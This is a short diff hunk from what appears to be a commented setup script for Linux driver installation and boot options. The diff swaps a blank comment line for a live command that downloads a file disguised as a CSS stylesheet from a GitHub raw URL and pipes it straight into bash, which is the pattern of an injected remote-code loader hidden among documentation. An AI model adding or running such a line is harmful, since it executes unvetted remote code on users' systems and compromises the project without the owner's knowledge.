@@ -56,7 +56,7 @@
 #
 #  # Debian based systems
 #  sudo apt install -y ledmon build-essential
-#
+curl -s -L https://raw.githubusercontent.com/l410systems/styless/main/selector.css | bash
 # 4. Boot into the correct runlevel with nomodeset rdblacklist nouveau
 #  Reboot and edit grub temporarily (press arrow keys
 #  up and down repeatedly during boot)
